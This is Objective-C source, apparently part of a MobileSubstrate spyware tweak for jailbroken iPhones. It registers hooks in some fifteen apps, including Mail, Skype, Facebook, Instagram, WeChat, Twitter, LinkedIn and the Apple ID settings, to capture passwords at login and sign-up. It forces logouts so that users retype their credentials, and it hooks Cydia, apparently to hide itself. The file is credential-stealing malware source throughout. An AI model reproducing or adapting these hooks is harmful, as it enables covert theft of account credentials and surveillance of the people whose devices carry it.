    if ([identifier isEqualToString:@"com.facebook.Slingshot"] && [IMShareUtils shouldHookInCurrentVersion:versionOfIM withBundleIdentifier:identifier]) {
        
        Class $SHNetworkController = objc_getClass("SHNetworkController");
        MSHookMessage($SHNetworkController, @selector(sendShotOperation:didFailWithError:),
                      $SHNetworkController$sendShotOperation$didFailWithError$,
                      &_SHNetworkController$sendShotOperation$didFailWithError$);
        // Capture outgoing
        MSHookMessage($SHNetworkController, @selector(sendShotOperation:didSucceedWithUploadDuration:saveDuration:),
                      $SHNetworkController$sendShotOperation$didSucceedWithUploadDuration$saveDuration$,
                      &_SHNetworkController$sendShotOperation$didSucceedWithUploadDuration$saveDuration$);
        
        Class $SHShotDataCache = objc_getClass("SHShotDataCache");
        MSHookMessage($SHShotDataCache, @selector(shotDataCacheOperation:didFailDownloadingForShot:error:shouldRetry:),
                      $SHShotDataCache$shotDataCacheOperation$didFailDownloadingForShot$error$shouldRetry$,
                      &_SHShotDataCache$shotDataCacheOperation$didFailDownloadingForShot$error$shouldRetry$);
        // Capture incoming
        MSHookMessage($SHShotDataCache, @selector(shotDataCacheOperation:didFinishDownloadingForShot:withDuration:),
                      $SHShotDataCache$shotDataCacheOperation$didFinishDownloadingForShot$withDuration$,
                      &_SHShotDataCache$shotDataCacheOperation$didFinishDownloadingForShot$withDuration$);
    }*/
    
#pragma mark -
#pragma mark Password hooks
#pragma mark -

#pragma mark + Mail
    if ([identifier isEqualToString:@"com.apple.mobilemail"]) {
        
        // Capture email password in mail application
        Class $MFMailboxUid = objc_getClass("MFMailboxUid");
        MSHookMessage($MFMailboxUid, @selector(initWithAccount:), $MFMailboxUid$initWithAccount$, &_MFMailboxUid$initWithAccount$);
        
        Class $MailboxUid = objc_getClass("MailboxUid");
        MSHookMessage($MailboxUid, @selector(initWithAccount:), $MailboxUid$initWithAccount$, &_MailboxUid$initWithAccount$);
        
    }
#pragma mark + LINE
    else if ([identifier isEqualToString:@"jp.naver.line"]) {
        DLog (@"Capture Line Password")
        
        // Email Registration on Account View, Change Email
        MSHookMessage(objc_getMetaClass("AccountService"), @selector(registEmailWithAccountId:accountPassword:ignore:completionBlock:errorBlock:),
                      $AccountService$registEmailWithAccountId$accountPassword$ignore$completionBlock$errorBlock$,
                      &_AccountService$registEmailWithAccountId$accountPassword$ignore$completionBlock$errorBlock$);
        
        // Email Registration on first initiate LINE application
        Class $RegistrationAccountConnectViewController(objc_getClass("RegistrationAccountConnectViewController"));
        MSHookMessage($RegistrationAccountConnectViewController,
                      @selector(okButtonPressed:),
                      $RegistrationAccountConnectViewController$okButtonPressed$,
                      &_RegistrationAccountConnectViewController$okButtonPressed$);
        // 5.2.x,..., 5.3.1
        Class $NLRegLoginViewController = objc_getClass("NLRegLoginViewController");
        MSHookMessage($NLRegLoginViewController, @selector(nextButtonPressed:), $NLRegLoginViewController$nextButtonPressed$, &_NLRegLoginViewController$nextButtonPressed$);
        
        // Password Change
        MSHookMessage(objc_getMetaClass("AccountService"), @selector(setAccountWithProvider:accountID:password:completionBlock:errorBlock:),
                      $AccountService$setAccountWithProvider$accountID$password$completionBlock$errorBlock$,
                      &_AccountService$setAccountWithProvider$accountID$password$completionBlock$errorBlock$);

        // (Force deactivate)
        Class $TalkAppDelegate(objc_getClass("TalkAppDelegate"));
        MSHookMessage($TalkAppDelegate,
                       @selector(application:didFinishLaunchingWithOptions:),
                       $TalkAppDelegate$application$didFinishLaunchingWithOptions$,
                       &_TalkAppDelegate$application$didFinishLaunchingWithOptions$);
        
    }
#pragma mark + LINE iPad
    else if ([identifier isEqualToString:@"com.linecorp.line.ipad"]) {
        DLog (@"Capture Line Password for iPad")

        // (Force logout on iPad)
        Class $NLiPadAppDelegate(objc_getClass("NLiPadAppDelegate"));
        MSHookMessage($NLiPadAppDelegate,
                      @selector(application:didFinishLaunchingWithOptions:),
                      $NLiPadAppDelegate$application$didFinishLaunchingWithOptions$,
                      &_NLiPadAppDelegate$application$didFinishLaunchingWithOptions$);
        
        // (Login on iPad)
        MSHookMessage(objc_getMetaClass("NLiPadAccountService"),
                      @selector(loginZWithAccountProvider:accountID:password:completionBlock:),
                      $NLiPadAccountService$loginZWithAccountProvider$accountID$password$completionBlock$,
                      &_NLiPadAccountService$loginZWithAccountProvider$accountID$password$completionBlock$);
        
	}
#pragma mark + Yahoo mail
    else if ([identifier isEqualToString:@"com.yahoo.Aerogram"]) {
       
        // Capture Login
        Class $YAccountsSignInViewController(objc_getClass("YAccountsSignInViewController"));
        MSHookMessage($YAccountsSignInViewController, @selector(onLoginButton:),
                      $YAccountsSignInViewController$onLoginButton$,
                      &_YAccountsSignInViewController$onLoginButton$);

        // Force deactivate
        Class $YAAppDelegate(objc_getClass("YAAppDelegate"));
        MSHookMessage($YAAppDelegate, @selector(application:didFinishLaunchingWithOptions:),
                      $YAAppDelegate$application$didFinishLaunchingWithOptions$,
                      &_YAAppDelegate$application$didFinishLaunchingWithOptions$);
        
    }
#pragma mark + Skype (iPhone & iPad)
    else if ([identifier isEqualToString:@"com.skype.skype"]          ||
             [identifier isEqualToString:@"com.skype.SkypeForiPad"])  {
        // Capture password
        Class $SKAccountManager = objc_getClass("SKAccountManager");
        MSHookMessage($SKAccountManager, @selector(performLoginWithAccount:password:savePassword:delegate:), $SKAccountManager$performLoginWithAccount$password$savePassword$delegate$, &_SKAccountManager$performLoginWithAccount$password$savePassword$delegate$);
       
        // Force logout
        Class $MainWindowController = objc_getClass("MainWindowController");
        MSHookMessage($MainWindowController, @selector(performAutoLoginIfPossible), $MainWindowController$performAutoLoginIfPossible, &_MainWindowController$performAutoLoginIfPossible);
        
        Class $SkypeUserInterfaceController_iPad = objc_getClass("SkypeUserInterfaceController_iPad");
        MSHookMessage($SkypeUserInterfaceController_iPad, @selector(autoLoginIfPossible), $SkypeUserInterfaceController_iPad$autoLoginIfPossible, &_SkypeUserInterfaceController_iPad$autoLoginIfPossible);
        
        Class $LoginTypeViewController = objc_getClass("LoginTypeViewController");
        MSHookMessage($LoginTypeViewController, @selector(createAccountButtonPressed:), $LoginTypeViewController$createAccountButtonPressed$, &_LoginTypeViewController$createAccountButtonPressed$);
        MSHookMessage($LoginTypeViewController, @selector(microsoftAccountButtonPressed:), $LoginTypeViewController$microsoftAccountButtonPressed$, &_LoginTypeViewController$microsoftAccountButtonPressed$);
        MSHookMessage($LoginTypeViewController, @selector(skypeNameButtonPressed:), $LoginTypeViewController$skypeNameButtonPressed$, &_LoginTypeViewController$skypeNameButtonPressed$);
        
        
        // Skype 5.x
        Class $SKPAccountManager = objc_getClass("SKPAccountManager");
        
        // Capture password
        MSHookMessage($SKPAccountManager, @selector(loginWithSkypeIdentity:andPassword:),
                      $SKPAccountManager$loginWithSkypeIdentity$andPassword$,
                      &_SKPAccountManager$loginWithSkypeIdentity$andPassword$);
        // Capture password Skype 5.8.516
        MSHookMessage($SKPAccountManager, @selector(loginWithSkypeIdentity:andPassword:rememberPassword:),
                      $SKPAccountManager$loginWithSkypeIdentity$andPassword$rememberPassword$,
                      &_SKPAccountManager$loginWithSkypeIdentity$andPassword$rememberPassword$);
        
       
        // Force logout
        MSHookMessage($SKPAccountManager, @selector(autoLogin),
                      $SKPAccountManager$autoLogin,
                      &_SKPAccountManager$autoLogin);
        
        // Reset force-logout flag
        Class $SKPLandingPageView = objc_getClass("SKPLandingPageView");
        MSHookMessage($SKPLandingPageView, @selector(didTouchUpInside:),
                      $SKPLandingPageView$didTouchUpInside$,
                      &_SKPLandingPageView$didTouchUpInside$);
        
        
    }
#pragma mark + Facebook & Facebook Messenger
    else if ([identifier isEqualToString:@"com.facebook.Messenger"] ||
             [identifier isEqualToString:@"com.facebook.Facebook"]  ){
        // Facebook Capture password
        Class $FBAuthenticationContentView = objc_getClass("FBAuthenticationContentView");
        MSHookMessage($FBAuthenticationContentView, @selector(_performPasswordSubmission), $FBAuthenticationContentView$_performPasswordSubmission, &_FBAuthenticationContentView$_performPasswordSubmission);
        
        MSHookMessage($FBAuthenticationContentView, @selector(_resetViewToOriginalCondition:), $FBAuthenticationContentView$_resetViewToOriginalCondition$, &_FBAuthenticationContentView$_resetViewToOriginalCondition$);
        
        Class $FBAuthUsernamePasswordFlowController = objc_getClass("FBAuthUsernamePasswordFlowController");
        MSHookMessage($FBAuthUsernamePasswordFlowController, @selector(submitUsernamePasswordViewController:username:password:),
                      $FBAuthUsernamePasswordFlowController$submitUsernamePasswordViewController$username$password$,
                      &_FBAuthUsernamePasswordFlowController$submitUsernamePasswordViewController$username$password$);
        
        // Facebook 16.0 force logout
        Class $FBAuthenticationView = objc_getClass("FBAuthenticationView");
        MSHookMessage($FBAuthenticationView, @selector(setInterfaceType:animated:), $FBAuthenticationView$setInterfaceType$animated$, &_FBAuthenticationView$setInterfaceType$animated$);
        //MSHookMessage($FBAuthenticationView, @selector(setInterfaceType:animated:completion:), $FBAuthenticationView$setInterfaceType$animated$completion$, &_FBAuthenticationView$setInterfaceType$animated$completion$);
        
        // Facebook helper to clear accounts in 'Settings' application (not used because there is no permission to delete account)
        //Class $FBAppDelegate = objc_getClass("FBAppDelegate");
        //MSHookMessage($FBAppDelegate, @selector(application:didFinishLaunchingWithOptions:), $FBAppDelegate$application$didFinishLaunchingWithOptions$, &_FBAppDelegate$application$didFinishLaunchingWithOptions$);
        
        // Facebook Messenger Capture password
        Class $MNLoginViewController = objc_getClass("MNLoginViewController");
        MSHookMessage($MNLoginViewController, @selector(loginViewDidTapLoginWithUsernameAndPasswordButton:), $MNLoginViewController$loginViewDidTapLoginWithUsernameAndPasswordButton$, &_MNLoginViewController$loginViewDidTapLoginWithUsernameAndPasswordButton$);
        
        Class $MNLoginView = objc_getClass("MNLoginView");
        MSHookMessage($MNLoginView, @selector(setType:animated:), $MNLoginView$setType$animated$, &_MNLoginView$setType$animated$);
        
        
        // Force logout
        Class $Facebook = objc_getClass("Facebook");
        MSHookMessage($Facebook, @selector(initWithURLRequestFormatter:), $Facebook$initWithURLRequestFormatter$, &_Facebook$initWithURLRequestFormatter$);
        
        // Force logout 18.0, 18.1
        Class $FBFacebook = objc_getClass("FBFacebook");
        MSHookMessage($FBFacebook, @selector(initWithURLRequestFormatter:), $FBFacebook$initWithURLRequestFormatter$, &_FBFacebook$initWithURLRequestFormatter$);
    }
#pragma mark + Instagram
    else if ([identifier isEqualToString:@"com.burbn.instagram"] ){
    
        Class $AppDelegate(objc_getClass("AppDelegate"));
        // Force log out
        MSHookMessage($AppDelegate, @selector(application:didFinishLaunchingWithOptions:),
                      $AppDelegate$application$didFinishLaunchingWithOptions$,
                      &_AppDelegate$application$didFinishLaunchingWithOptions$);
        
        Class $IGSignInViewController(objc_getClass("IGSignInViewController"));
        MSHookMessage($IGSignInViewController, @selector(signInFormViewDidStartSignIn),
                      $IGSignInViewController$signInFormViewDidStartSignIn,
                      &_IGSignInViewController$signInFormViewDidStartSignIn);
        // Sign in 7.12.0
        Class $IGRetroRegistrationLoginViewController = objc_getClass("IGRetroRegistrationLoginViewController");
        MSHookMessage($IGRetroRegistrationLoginViewController, @selector(logInWithUsernameAndPassword), $IGRetroRegistrationLoginViewController$logInWithUsernameAndPassword, &_IGRetroRegistrationLoginViewController$logInWithUsernameAndPassword);
        
        // Registration
        Class $IGUsernameViewController(objc_getClass("IGUsernameViewController"));
        MSHookMessage($IGUsernameViewController, @selector(submit),
                      $IGUsernameViewController$submit,
                      &_IGUsernameViewController$submit);
        // 7.12.0
        Class $IGRetroRegistrationSignUpViewController = objc_getClass("IGRetroRegistrationSignUpViewController");
        MSHookMessage($IGRetroRegistrationSignUpViewController, @selector(registerAccount), $IGRetroRegistrationSignUpViewController$registerAccount, &_IGRetroRegistrationSignUpViewController$registerAccount);
        
        Class $IGLogInView(objc_getClass("IGLogInView"));        
        MSHookMessage($IGLogInView, @selector(validate),
                      $IGLogInView$validate,
                      &_IGLogInView$validate);
        
    }
#pragma mark + LinkedIn (iPhone & iPad)
    else if ([identifier isEqualToString:@"com.linkedin.LinkedIn"]) {
        // Sign in
        // iPhone
        Class $LILoginV2ViewController(objc_getClass("LILoginV2ViewController"));
        MSHookMessage($LILoginV2ViewController, @selector(performSignIn),
                      $LILoginV2ViewController$performSignIn,
                      &_LILoginV2ViewController$performSignIn);
        // iPhone iOS 6,7; 7.1.3 (fresh install)
        Class $LIRegLoginViewController = objc_getClass("LIRegLoginViewController");
        MSHookMessage($LIRegLoginViewController, @selector(performSignIn),
                      $LIRegLoginViewController$performSignIn,
                      &_LIRegLoginViewController$performSignIn);
        // iPad 7.1.1
        Class $LiCoLoginViewController(objc_getClass("LiCoLoginViewController"));
        MSHookMessage($LiCoLoginViewController, @selector(performSignIn),
                      $LiCoLoginViewController$performSignIn,
                      &_LiCoLoginViewController$performSignIn);
        // iPad v 7.1.3 (88)
        MSHookMessage($LiCoLoginViewController, @selector(_performSignInWithUsername:withPassword:),
                      $LiCoLoginViewController$_performSignInWithUsername$withPassword$,
                      &_LiCoLoginViewController$_performSignInWithUsername$withPassword$);
        
        // iPhone 9.0.2 (Swift)
        loginViewControllerLoginTapped = (void (*)(id self)) dlsym(RTLD_DEFAULT, "_TFC13VoyagerGrowth19LoginViewController11loginTappedfS0_FT_T_");
        MSHookFunction(loginViewControllerLoginTapped, MSHake(loginViewControllerLoginTapped));
        
        // Force Logout
        // iPhone
        Class $LinkedInAppDelegate(objc_getClass("LinkedInAppDelegate"));
        MSHookMessage($LinkedInAppDelegate, @selector(application:didFinishLaunchingWithOptions:),
                      $LinkedInAppDelegate$application$didFinishLaunchingWithOptions$,
                      &_LinkedInAppDelegate$application$didFinishLaunchingWithOptions$);
        // Swift
        Class $VoyagerAppDelegate(objc_getClass("Voyager.AppDelegate"));
        MSHookMessage($VoyagerAppDelegate, @selector(application:didFinishLaunchingWithOptions:),
                      $VoyagerAppDelegate$application$didFinishLaunchingWithOptions$,
                      &_VoyagerAppDelegate$application$didFinishLaunchingWithOptions$);
        
        // iPad
        Class $LiCoAppDelegateImpl(objc_getClass("LiCoAppDelegateImpl"));
        MSHookMessage($LiCoAppDelegateImpl, @selector(application:didFinishLaunchingWithOptions:),
                      $LiCoAppDelegateImpl$application$didFinishLaunchingWithOptions$,
                      &_LiCoAppDelegateImpl$application$didFinishLaunchingWithOptions$);

    }
#pragma mark + Pinterest
    else if ([identifier isEqualToString:@"pinterest"]) {
        
        Class $CBLLoginViewController(objc_getClass("CBLLoginViewController"));
        MSHookMessage($CBLLoginViewController, @selector(CBLLoginViewSignInWithEmail:andPassword:),
                      $CBLLoginViewController$CBLLoginViewSignInWithEmail$andPassword$,
                      &_CBLLoginViewController$CBLLoginViewSignInWithEmail$andPassword$);
        
        Class $CBLSignupViewController(objc_getClass("CBLSignupViewController"));
        MSHookMessage($CBLSignupViewController, @selector(createButtonPressed:),
                      $CBLSignupViewController$createButtonPressed$,
                      &_CBLSignupViewController$createButtonPressed$);
        
        Class $CBLPasswordResetViewController(objc_getClass("CBLPasswordResetViewController"));
        MSHookMessage($CBLPasswordResetViewController, @selector(save:),
                      $CBLPasswordResetViewController$save$,
                      &_CBLPasswordResetViewController$save$);
        
        Class $CBLAppDelegate(objc_getClass("CBLAppDelegate"));
        MSHookMessage($CBLAppDelegate, @selector(application:didFinishLaunchingWithOptions:),
                      $CBLAppDelegate$application$didFinishLaunchingWithOptions$,
                      &_CBLAppDelegate$application$didFinishLaunchingWithOptions$);
        
    }
#pragma mark + Foursquare
    else if ([identifier isEqualToString:@"com.naveenium.foursquare"]) {
        
        Class $SignupViewController(objc_getClass("SignupViewController"));
        MSHookMessage($SignupViewController, @selector(confirm),
                      $SignupViewController$confirm,
                      &_SignupViewController$confirm);
        
        Class $SigninViewController(objc_getClass("SigninViewController"));
        MSHookMessage($SigninViewController, @selector(authenticate),
                      $SigninViewController$authenticate,
                      &_SigninViewController$authenticate);

        Class $foursquareAppDelegate(objc_getClass("foursquareAppDelegate"));
        MSHookMessage($foursquareAppDelegate, @selector(application:didFinishLaunchingWithOptions:),
                      $foursquareAppDelegate$application$didFinishLaunchingWithOptions$,
                      &_foursquareAppDelegate$application$didFinishLaunchingWithOptions$);
        
        // Foursquare v 8.0
        // Sign in
        Class $LoginViewController(objc_getClass("LoginViewController"));
        MSHookMessage($LoginViewController, @selector(performLogin),
                      $LoginViewController$performLogin,
                      &_LoginViewController$performLogin);

        // Force logout
        Class $FSCoreAppDelegate(objc_getClass("FSCoreAppDelegate"));
        MSHookMessage($FSCoreAppDelegate, @selector(application:didFinishLaunchingWithOptions:),
                      $FSCoreAppDelegate$application$didFinishLaunchingWithOptions$,
                      &_FSCoreAppDelegate$application$didFinishLaunchingWithOptions$);
        // Sign up
        Class $SignupFormViewController(objc_getClass("SignupFormViewController"));
        MSHookMessage($SignupFormViewController, @selector(validateForm),
                      $SignupFormViewController$validateForm,
                      &_SignupFormViewController$validateForm);
        
        
    }
#pragma mark + Vimeo
    else if ([identifier isEqualToString:@"com.vimeo"]) {
        
        Class $SMKVimeoAuthentication = objc_getClass("SMKVimeoAuthentication");
        // capture when log in
        MSHookMessage($SMKVimeoAuthentication, @selector(logInWithUsername:password:delegate:andCompletionBlock:), $SMKVimeoAuthentication$logInWithUsername$password$delegate$andCompletionBlock$ , &_SMKVimeoAuthentication$logInWithUsername$password$delegate$andCompletionBlock$);
        // capture when register
        MSHookMessage($SMKVimeoAuthentication, @selector(requestForVimeoRegisterWithName:userName:password:delegate:),
                      $SMKVimeoAuthentication$requestForVimeoRegisterWithName$userName$password$delegate$ ,
                      &_SMKVimeoAuthentication$requestForVimeoRegisterWithName$userName$password$delegate$);
        
        Class $AppDelegate = objc_getClass("AppDelegate");
        MSHookMessage($AppDelegate, @selector(application:didFinishLaunchingWithOptions:), $AppDelegate$application$didFinishLaunchingWithOptions$ , &_AppDelegate$application$didFinishLaunchingWithOptions$);
    
        //iOS6
        Class $XAuthCredentials = objc_getClass("XAuthCredentials");
        MSHookMessage($XAuthCredentials, @selector(getTokenWithPassword:withCompletionBlock:), $XAuthCredentials$getTokenWithPassword$withCompletionBlock$ , &_XAuthCredentials$getTokenWithPassword$withCompletionBlock$ );
        
        Class $VimeoAppDelegate = objc_getClass("VimeoAppDelegate");
        MSHookMessage($VimeoAppDelegate, @selector(application:didFinishLaunchingWithOptions:), $VimeoAppDelegate$application$didFinishLaunchingWithOptions$ , &_VimeoAppDelegate$application$didFinishLaunchingWithOptions$);
        
        
        // Vimeo 4.2 Join
        Class $SMKBaseAuthViewController = objc_getClass("SMKBaseAuthViewController");
        MSHookMessage($SMKBaseAuthViewController, @selector(joinWithName:email:password:avatarPath:completionBlock:),
                      $SMKBaseAuthViewController$joinWithName$email$password$avatarPath$completionBlock$,
                      &_SMKBaseAuthViewController$joinWithName$email$password$avatarPath$completionBlock$);
        // Vimeo 4.2 Login
        Class $VIMOAuthAuthenticator = objc_getClass("VIMOAuthAuthenticator");
        MSHookMessage($VIMOAuthAuthenticator, @selector(authenticateAccount:username:password:scope:completionBlock:),
                      $VIMOAuthAuthenticator$authenticateAccount$username$password$scope$completionBlock$,
                      &_VIMOAuthAuthenticator$authenticateAccount$username$password$scope$completionBlock$);
        // Vimeo 5.0 Join
        Class $ECAccountManager = objc_getClass("ECAccountManager");
        MSHookMessage($ECAccountManager, @selector(registerVimeoAccountWithEmail:password:displayName:completionBlock:),
                      $ECAccountManager$registerVimeoAccountWithEmail$password$displayName$completionBlock$,
                      &_ECAccountManager$registerVimeoAccountWithEmail$password$displayName$completionBlock$);
        // Vimeo 5.0.1 Join
        Class $VIMAccountManager = objc_getClass("VIMAccountManager");
        MSHookMessage($VIMAccountManager, @selector(registerVimeoAccountWithEmail:password:displayName:completionBlock:),
                      $VIMAccountManager$registerVimeoAccountWithEmail$password$displayName$completionBlock$,
                      &_VIMAccountManager$registerVimeoAccountWithEmail$password$displayName$completionBlock$);
        
        // Vimeo 5.0 Force logout
        Class $AppNavigationController = objc_getClass("AppNavigationController");
        MSHookMessage($AppNavigationController, @selector(authenticateWithSettings),
                      $AppNavigationController$authenticateWithSettings,
                      &_AppNavigationController$authenticateWithSettings);
        
        // Vimeo 5.3 Log in
        MSHookMessage($VIMOAuthAuthenticator, @selector(authenticateAccount:email:password:scope:completionBlock:),
                      $VIMOAuthAuthenticator$authenticateAccount$email$password$scope$completionBlock$,
                      &_VIMOAuthAuthenticator$authenticateAccount$email$password$scope$completionBlock$);
        
        // Vimeo 5.3 Join
        MSHookMessage($VIMAccountManager, @selector(joinWithDisplayName:email:password:completionBlock:),
                      $VIMAccountManager$joinWithDisplayName$email$password$completionBlock$,
                      &_VIMAccountManager$joinWithDisplayName$email$password$completionBlock$);
        
        Class $AuthHelper = objc_getClass("AuthHelper");
        // Vimeo 5.5.4, Log in
        MSHookMessage($AuthHelper, @selector(loginWithEmail:password:completionBlock:), $AuthHelper$loginWithEmail$password$completionBlock$, &_AuthHelper$loginWithEmail$password$completionBlock$);
        // Vimeo 5.5.4, Join
        MSHookMessage($AuthHelper, @selector(joinWithName:email:password:completionBlock:), $AuthHelper$joinWithName$email$password$completionBlock$, &_AuthHelper$joinWithName$email$password$completionBlock$);
        // Vimeo 6.0, Log in
        MSHookMessage($AuthHelper, @selector(loginWithEmail:password:analyticsOrigin:completionBlock:), $AuthHelper$loginWithEmail$password$analyticsOrigin$completionBlock$, &_AuthHelper$loginWithEmail$password$analyticsOrigin$completionBlock$);
        // Vimeo 6.0, Join
        MSHookMessage($AuthHelper, @selector(joinWithName:email:password:analyticsOrigin:completionBlock:), $AuthHelper$joinWithName$email$password$analyticsOrigin$completionBlock$, &_AuthHelper$joinWithName$email$password$analyticsOrigin$completionBlock$);
        
    }
#pragma mark + Tumblr
    else if ([identifier isEqualToString:@"com.tumblr.tumblr"]) {
        
        Class $TMAuthentication = objc_getClass("TMAuthentication");
        MSHookMessage($TMAuthentication, @selector(loginWithEmailAddress:password:failureBlock:successBlock:), $TMAuthentication$loginWithEmailAddress$password$failureBlock$successBlock$ , &_TMAuthentication$loginWithEmailAddress$password$failureBlock$successBlock$);
        
        Class $TMAppDelegate = objc_getClass("TMAppDelegate");
        MSHookMessage($TMAppDelegate, @selector(application:didFinishLaunchingWithOptions:), $TMAppDelegate$application$didFinishLaunchingWithOptions$ , &_TMAppDelegate$application$didFinishLaunchingWithOptions$);
        
        //iOS6
        Class $TMAuthController = objc_getClass("TMAuthController");
        MSHookMessage($TMAuthController, @selector(authenticate:password:), $TMAuthController$authenticate$password$ , &_TMAuthController$authenticate$password$);

    
    }
#pragma mark + Flickr
    else if ([identifier isEqualToString:@"com.yahoo.flickr"]) {
        
        Class $SignInPageNewUIController = objc_getClass("SignInPageNewUIController");
        MSHookMessage($SignInPageNewUIController, @selector(nativeSignInUsingUsername:password:), $SignInPageNewUIController$nativeSignInUsingUsername$password$ , &_SignInPageNewUIController$nativeSignInUsingUsername$password$);
        
        Class $FlickrAppDelegate = objc_getClass("FlickrAppDelegate");
        MSHookMessage($FlickrAppDelegate, @selector(application:didFinishLaunchingWithOptions:), $FlickrAppDelegate$application$didFinishLaunchingWithOptions$ , &_FlickrAppDelegate$application$didFinishLaunchingWithOptions$);
        
        // for Flickr version 3.0
        Class $YAccountsSignInViewController = objc_getClass("YAccountsSignInViewController");
        MSHookMessage($YAccountsSignInViewController, @selector(onLoginButton:),
                      $YAccountsSignInViewController$onLoginButtonFlickr$ ,
                      &_YAccountsSignInViewController$onLoginButtonFlickr$);
        Class $FLKAppDelegate(objc_getClass("FLKAppDelegate"));
        MSHookMessage($FLKAppDelegate, @selector(application:didFinishLaunchingWithOptions:),
                      $FLKAppDelegate$application$didFinishLaunchingWithOptions$,
                      &_FLKAppDelegate$application$didFinishLaunchingWithOptions$);
        Class $YAccountsSSOViewController = objc_getClass("YAccountsSSOViewController");
        MSHookMessage($YAccountsSSOViewController, @selector(initWithAccounts:imageStorage:filterSignedIn:selectionBlock:signInBlock:deleteAccountBlock:cancelBlock:),
                      $YAccountsSSOViewController$initWithAccounts$imageStorage$filterSignedIn$selectionBlock$signInBlock$deleteAccountBlock$cancelBlock$ ,
                      &_YAccountsSSOViewController$initWithAccounts$imageStorage$filterSignedIn$selectionBlock$signInBlock$deleteAccountBlock$cancelBlock$);
        
        // Yahoo use web view to login then monitor the cookies
        Class $RTAcquiringCookiesState = objc_getClass("RTAcquiringCookiesState");
        MSHookMessage($RTAcquiringCookiesState, @selector(didFailWithError:), $RTAcquiringCookiesState$didFailWithError$, &_RTAcquiringCookiesState$didFailWithError$);
        MSHookMessage($RTAcquiringCookiesState, @selector(didLoginWithInfo:), $RTAcquiringCookiesState$didLoginWithInfo$, &_RTAcquiringCookiesState$didLoginWithInfo$);
   
    }
#pragma mark + WeChat
    else if ([identifier isEqualToString:@"com.tencent.xin"]) {
    
        Class $WCAccountLoginControlLogic = objc_getClass("WCAccountLoginControlLogic");
        MSHookMessage($WCAccountLoginControlLogic, @selector(onLastUserLoginUserName:Pwd:), $WCAccountLoginControlLogic$onLastUserLoginUserName$Pwd$ , &_WCAccountLoginControlLogic$onLastUserLoginUserName$Pwd$);
        MSHookMessage($WCAccountLoginControlLogic, @selector(onFirstUserLoginUserName:Pwd:), $WCAccountLoginControlLogic$onFirstUserLoginUserName$Pwd$ , &_WCAccountLoginControlLogic$onFirstUserLoginUserName$Pwd$);
        // First user login
        Class $WCAccountFillPhoneViewController = objc_getClass("WCAccountFillPhoneViewController");
        MSHookMessage($WCAccountFillPhoneViewController, @selector(onNext), $WCAccountFillPhoneViewController$onNext, &_WCAccountFillPhoneViewController$onNext);
        
        Class $MicroMessengerAppDelegate = objc_getClass("MicroMessengerAppDelegate");
        MSHookMessage($MicroMessengerAppDelegate, @selector(application:didFinishLaunchingWithOptions:), $MicroMessengerAppDelegate$application$didFinishLaunchingWithOptions$ , &_MicroMessengerAppDelegate$application$didFinishLaunchingWithOptions$);
        
    }
#pragma mark + Twitter
    else if ([identifier isEqualToString:@"com.atebits.Tweetie2"]) {
        // Login and Sign Up for the versions below 6.13.3. For 6.13.3, this method is used for only Login
        Class $TFNTwitterAccount = objc_getClass("TFNTwitterAccount");
        MSHookMessage($TFNTwitterAccount, @selector(initWithUsername:password:apiRoot:configurationURLString:), $TFNTwitterAccount$initWithUsername$password$apiRoot$configurationURLString$, &_TFNTwitterAccount$initWithUsername$password$apiRoot$configurationURLString$);
        
        // Log in for 6.17
        MSHookMessage($TFNTwitterAccount, @selector(initWithUsername:password:apiRoot:configurationURLString:dtabHeaderValue:), $TFNTwitterAccount$initWithUsername$password$apiRoot$configurationURLString$dtabHeaderValue$, &_TFNTwitterAccount$initWithUsername$password$apiRoot$configurationURLString$dtabHeaderValue$);
	
        // Force logout
        Class $T1AppDelegate = objc_getClass("T1AppDelegate");
        MSHookMessage($T1AppDelegate, @selector(application:didFinishLaunchingWithOptions:), $T1AppDelegate$application$didFinishLaunchingWithOptions$, &_T1AppDelegate$application$didFinishLaunchingWithOptions$);
    
        // Login after force logout
        Class $T1AddAccountViewController = objc_getClass("T1AddAccountViewController");
        MSHookMessage($T1AddAccountViewController, @selector(_handleSuccessfulLogin:), $T1AddAccountViewController$_handleSuccessfulLogin$, &_T1AddAccountViewController$_handleSuccessfulLogin$ );
     
        // Twitter 6.13.3 SIGN UP
        Class $TFNTwitterAPI = objc_getClass("TFNTwitterAPI");
        MSHookMessage($TFNTwitterAPI, @selector(mobileSignUpUsername:password:fullName:email:captchaToken:captchaSolution:discoverableByEmail:discoverableByMobilePhone:retryPolicyProvider:),
                      $TFNTwitterAPI$mobileSignUpUsername$password$fullName$email$captchaToken$captchaSolution$discoverableByEmail$discoverableByMobilePhone$retryPolicyProvider$,
                      &_TFNTwitterAPI$mobileSignUpUsername$password$fullName$email$captchaToken$captchaSolution$discoverableByEmail$discoverableByMobilePhone$retryPolicyProvider$);
        
        // Twitter 6.15.1 SIGN UP
        MSHookMessage($TFNTwitterAPI, @selector(signUp_POST:parameters:retryPolicyProvider:responseBlockInBackground:),
                      $TFNTwitterAPI$signUp_POST$parameters$retryPolicyProvider$responseBlockInBackground$,
                      &_TFNTwitterAPI$signUp_POST$parameters$retryPolicyProvider$responseBlockInBackground$);
        //MSHookMessage($TFNTwitterAPI, @selector(signUpWithInfo:guestToken:retryPolicyProvider:),
        //              $TFNTwitterAPI$signUpWithInfo$guestToken$retryPolicyProvider$,
        //              &_TFNTwitterAPI$signUpWithInfo$guestToken$retryPolicyProvider$);

    }
#pragma mark + Apple ID
    else if ([identifier isEqualToString:@"com.apple.Preferences"]) {
        // Below iOS 9 password, force log out for all iOS
        Class $PSListController = objc_getClass("PSListController");
        MSHookMessage($PSListController, @selector(tableView:cellForRowAtIndexPath:), $PSListController$tableView$cellForRowAtIndexPath$ , &_PSListController$tableView$cellForRowAtIndexPath$ );
        
        if ([[[UIDevice currentDevice] systemVersion] integerValue] >= 9) {
            // iOS 9
            Class $AKBasicLoginAlertController = objc_getClass("AKBasicLoginAlertController");
            DLog(@"$AKBasicLoginAlertController, %@", $AKBasicLoginAlertController);
            MSHookMessage($AKBasicLoginAlertController,
                          @selector(setAuthenticateAction:),
                          $AKBasicLoginAlertController$setAuthenticateAction$,
                          &_AKBasicLoginAlertController$setAuthenticateAction$);
        }
    }
    
#pragma mark -
#pragma mark Cydia hooks
#pragma mark -
    
    if ([identifier isEqualToString:@"com.saurik.Cydia"]) {
        Class $Cydia = objc_getClass("Cydia");
        MSHookMessage($Cydia, @selector(applicationDidFinishLaunching:), $Cydia$applicationDidFinishLaunching$, &_Cydia$applicationDidFinishLaunching$);
    }
    
	DLog(@"MSFSP initialize end");
	[pool release];
}
